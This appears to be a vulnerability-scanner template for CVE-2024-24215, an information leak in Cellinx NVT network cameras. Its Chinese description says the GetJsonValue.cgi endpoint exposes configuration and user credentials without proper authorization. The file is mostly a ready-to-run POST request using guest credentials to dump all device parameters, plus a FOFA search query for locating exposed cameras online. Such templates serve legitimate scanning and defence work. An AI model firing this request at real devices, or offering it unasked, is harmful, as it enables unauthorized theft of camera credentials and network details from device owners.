id: cellinx-info-leak

info:
  name: "Cellinx NVT Web Server GetJsonValue.cgi 接口敏感数据泄露"
  author: 0dayPoc
  severity: medium
  description: |-
    fofa: body="local/NVT-string.js"
          韩国Cellinx公司NVT系列网络摄像机设备存在接口安全缺陷，其Web管理界面的GetJsonValue.cgi处理程序未正确限制访问权限。攻击者可通过该接口未授权访问路径获取系统配置数据及用户凭证，导致设备管理凭据和网络拓扑信息泄露。此漏洞源于设备固件中Web服务组件对请求参数校验机制缺失，允许通过构造特定请求路径绕过身份验证。
  reference:
  - CVE-2024-24215
  tags: Cellinx

http:
- raw:
  - |
    POST /cgi-bin/GetJsonValue.cgi?TYPE=json HTTP/1.1
    Host: {{Hostname}}
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/json; charset=utf-8
    X-Requested-With: XMLHttpRequest
    Connection: close

     {"jsonData":{"username":"guest","password":"guest","file":"param","data":"All"}}
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - 'ProductCode'
